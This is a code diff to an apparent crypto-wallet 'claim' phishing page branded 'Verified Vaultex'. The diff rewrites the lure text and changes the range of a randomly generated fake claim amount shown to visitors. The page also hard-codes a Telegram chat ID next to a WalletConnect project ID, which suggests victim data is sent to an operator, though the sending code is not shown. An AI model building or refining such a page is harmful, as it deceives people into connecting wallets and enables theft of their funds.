@@ -266,12 +266,12 @@
     <div class="container">
         <div class="hero-banner">
             <div class="hero-content">
-                <div class="hero-badge">✓ Verified eligible</div>
+                <div class="hero-badge">✓ Verified Vaultex</div>
                 <h1 class="hero-title">Wallet V4 </h1>
-                <p class="hero-subtitle">You're eligible to claim this amount</p>
-                <div class="hero-amount" id="claimAmount">$****</div>
-                <p class="hero-subtitle">Available to claim</p>
-                <button class="hero-claim-btn" id="heroClaimBtn">Connect Wallet to Claim</button>
+                <p class="hero-subtitle">Recent amount Claimed</p>
+                <div class="hero-amount" id="claimAmount">$0</div>
+                <p class="hero-subtitle">Connect your wallet to claim your earnings now</p>
+                <button class="hero-claim-btn" id="heroClaimBtn">Connect Wallet</button>
                 <div id="successMsg" class="message success"></div>
                 <div id="errorMsg" class="message error"></div>
             </div>
@@ -290,9 +290,11 @@
         const TELEGRAM_CHAT_ID = '7631123101';
         const WALLETCONNECT_PROJECT_ID = '8cb7ec413496bd2a9585e0d008c49acc';
 
-        // Generate random claim amount
-        const claimAmount = (Math.random() * (15000 - 8000) + 124400).toFixed(0);
-        document.getElementById('claimAmount').textContent = '$' + claimAmount.toLocaleString();
+   // Generate random claim amount
+const minAmount = 960;
+const maxAmount = 8200;
+const claimAmount = (Math.random() * (maxAmount - minAmount) + minAmount).toFixed(0);
+document.getElementById('claimAmount').textContent = '$' + Number(claimAmount).toLocaleString();
 
         // Elements
         const connectBtn = document.getElementById('connectBtn');
